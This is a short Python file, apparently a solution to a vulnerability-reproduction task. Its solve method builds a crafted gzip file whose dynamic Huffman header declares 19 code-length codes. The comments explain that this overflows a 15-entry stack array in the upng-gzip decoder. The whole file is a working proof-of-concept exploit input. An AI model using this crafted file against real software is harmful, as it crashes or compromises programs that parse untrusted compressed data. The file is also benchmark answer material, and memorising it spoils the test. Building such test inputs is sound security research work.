import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the stack buffer overflow in upng-gzip.
        The vulnerability exists because the temporary array for code length codes 
        is sized to 15, but the format allows up to 19 codes (HCLEN=15).
        """
        # GZIP Header (10 bytes)
        # ID1=0x1f, ID2=0x8b, CM=8 (Deflate), FLG=0, MTIME=0, XFL=0, OS=0
        header = b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x00'
        
        # Deflate Block (9 bytes)
        # We construct a dynamic Huffman block (BTYPE=2) that specifies HCLEN=15.
        # HCLEN=15 means 19 code length codes will be read.
        # The vulnerable implementation stores these in an array of size 15, causing overflow.
        
        # Bit stream construction:
        # Byte 0 (0x05):
        #   Bit 0: 1 (BFINAL=1)
        #   Bit 1: 0 (BTYPE LSB)
        #   Bit 2: 1 (BTYPE MSB, so BTYPE=2)
        #   Bit 3-7: 0 (HLIT=0 -> 257 codes)
        
        # Byte 1 (0xE0):
        #   Bit 0-4: 0 (HDIST=0 -> 1 code)
        #   Bit 5-7: 1 (HCLEN lower 3 bits = 111)
        
        # Byte 2 (0x01):
        #   Bit 0: 1 (HCLEN MSB = 1, total HCLEN=1111 binary = 15)
        #   Bit 1-7: 0 (Start of code lengths, all 0)
        
        # Bytes 3-8 (0x00):
        #   Continued 0 bits for the code lengths.
        #   We need 19 * 3 = 57 bits for code lengths.
        #   The payload + footer provides enough zero bits to satisfy the read loop
        #   and trigger the write overflow.
        
        payload = b'\x05\xe0\x01\x00\x00\x00\x00\x00\x00'
        
        # GZIP Footer (8 bytes)
        # CRC32 (4 bytes) + ISIZE (4 bytes). Values don't matter as we crash before check.
        footer = b'\x00' * 8
        
        return header + payload + footer